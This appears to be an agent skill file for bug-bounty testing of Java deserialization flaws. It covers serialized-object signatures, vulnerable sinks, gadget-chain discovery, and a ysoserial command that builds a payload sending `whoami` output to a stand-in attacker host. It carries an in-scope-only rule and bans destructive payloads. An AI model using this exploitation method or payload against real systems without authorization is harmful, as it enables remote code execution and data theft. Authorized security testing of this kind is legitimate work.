---
name: bbp-java-deserialization
description: Specialized skill for identifying and exploiting Java Deserialization vulnerabilities. Use when auditing Java applications (like Spring) that accept serialized objects, to find deserialization sinks and generate ysoserial gadget chains.
---

# Java Deserialization & Gadget Chains

## Objective
Identify unsafe deserialization sinks within a Java application and construct valid gadget chains using available classpath libraries to achieve Remote Code Execution (RCE).

## RoE / Scope Reminder
**CRITICAL:** Only test domains and IP addresses explicitly listed in the program's IN-SCOPE configuration. Java deserialization testing can easily crash applications or corrupt state. USE BLIND OAST (Out-Of-Band Application Security Testing) payloads (e.g., DNS ping) for validation. DO NOT use destructive payloads (like `rm -rf`, `reboot`, or file upload) during verification.

## Identification

### 1. Magic Bytes & Headers
Look for serialized objects in HTTP requests (cookies, headers, parameters, or bodies).
- **Hex:** `ac ed 00 05`
- **Base64:** `rO0AB`
- **Content-Type:** `application/x-java-serialized-object`

### 2. Common Vulnerable Sinks
When reviewing source code, look for:
- `ObjectInputStream.readObject()`
- `XMLDecoder.readObject()`
- `Yaml.load()` (SnakeYAML)
- `XStream.fromXML()`
- `ObjectMapper.readValue()` (Jackson with Default Typing enabled)
- RMI (Remote Method Invocation) / JMX endpoints.

## Exploitation (ysoserial)

### 1. Identify the Classpath
To successfully exploit deserialization, a "gadget chain" must exist in the application's dependencies. Check `pom.xml`, `build.gradle`, or use a tool like `gadgetinspector` to find what libraries are available (e.g., CommonsCollections, Spring, Hibernate, ROME).

### 2. Generate Payload
Use `ysoserial` to generate a payload for the specific gadget chain.
```bash
# Example: Generate a Spring1 payload to do a DNS lookup (OAST validation)
java -jar ysoserial.jar Spring1 "nslookup `whoami`.attacker.com" > payload.bin
```

### 3. Deliver Payload
Encode the payload (usually Base64 or URL encoded) and inject it into the vulnerable parameter/header.

## Advanced Vectors
- **Jackson/Fastjson:** If JSON is accepted, look for auto-type/default-typing bypasses.
- **Secondary Deserialization:** Some bypasses involve wrapping the payload in another class (like `java.util.PriorityQueue` or `BadAttributeValueExpException`).

## Validation Checklist
- [ ] Has a deserialization sink been confirmed (e.g., via source code or black-box errors)?
- [ ] Have the application's dependencies been mapped for potential gadget chains?
- [ ] Has a non-destructive OAST payload (DNS/HTTP ping) been used to confirm RCE?
- [ ] Is the finding clearly documented with the exact gadget chain used?
